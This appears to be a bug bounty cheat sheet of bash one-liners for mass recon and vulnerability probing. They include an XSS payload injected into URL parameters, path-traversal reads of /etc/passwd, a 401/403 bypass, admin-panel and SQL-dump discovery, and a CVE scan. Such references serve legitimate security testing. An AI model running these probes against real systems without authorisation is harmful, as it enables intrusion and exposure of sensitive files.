---
description: Bug Bounty one-liners
---

# One-liners

#### Web discovery with aquatone

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong>#https://twitter.com/_bughunter/status/1524396110084726784
</strong><strong>cat roots | assetfinder | naabu -silent -passive | httpx -silent -nc -p 80,443,8080,8443,8888 | aquatone</strong></code></pre>

#### 401 & 403 bypass using double slash

{% code overflow="wrap" %}
```bash
#https://twitter.com/_bughunter/status/1518829154120179712
#Change "/login" and "//login" with your path
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
```
{% endcode %}

#### XSS with waybackurls

{% code overflow="wrap" %}
```bash
#https://twitter.com/XssPayloads/status/1516971813515022341
#Oneliner XSS automation using waybackurls
echo http://target.com | waybackurls | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|icon|pdf|svg|txt|js)" | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```
{% endcode %}

#### Subdomain enumeration + ports open + http services

{% code overflow="wrap" %}
```bash
#https://twitter.com/FindomainApp/status/1513842984680370179
#Get all subdomains of a host, get the open ports of all of them (IP address deduplication), and check if there's an HTTP service running.
findomain -qt target.com | unimap --fast-scan --stdin --url-output | fhc
```
{% endcode %}

#### Find admin login page/panel

{% code overflow="wrap" %}
```bash
#https://twitter.com/h4x0r_dz/status/1515858135134650378
#Wordlist: https://github.com/the-robot/admin-finder/blob/master/wordlist.txt
cat domains_list.txt | httpx -ports 80,443,8080,8443 -paths "wordlist.txt" -mr "password"
```
{% endcode %}

#### crt.sh + nuclei

```bash
#https://twitter.com/Alra3ees/status/1515945056322129921
#https://github.com/az7rb/crt.sh
./crt.sh http://target.com | httpx | nuclei
```

#### LFI

{% code overflow="wrap" %}
```bash
#https://twitter.com/_bughunter/status/1515024009536155656
cat hosts | httpx -nc -t 250 -p 80,443,8080,8443,4443,8888 -path "///////../../../etc/passwd" -mr "root:x" | anew myP1s.txt

#https://twitter.com/zapstiko/status/1513850231451963400
gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
{% endcode %}

#### Specific web endpoint

{% code overflow="wrap" %}
```bash
#https://twitter.com/_bughunter/status/1514358466328080385
#Change "/wp-content/mysql.sql" with your endpoint
cat hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443  | anew myP1s.txt
```
{% endcode %}

#### SSRF using burp extension (collaborator everywhere)

```bash
#Install Collaborator Everywhere
#Execute the following code and inspect collaborator for pingbacks
httpx -l subdomains.txt -sc -cl -fr -proxy https://127.0.0.1:8080
```

#### Specific CVE using nuclei

{% code overflow="wrap" %}
```bash
cat domains.txt | httpx -silent | nuclei -t ../nuclei-templates/cves/2022/CVE-2022–1388.yaml
```
{% endcode %}
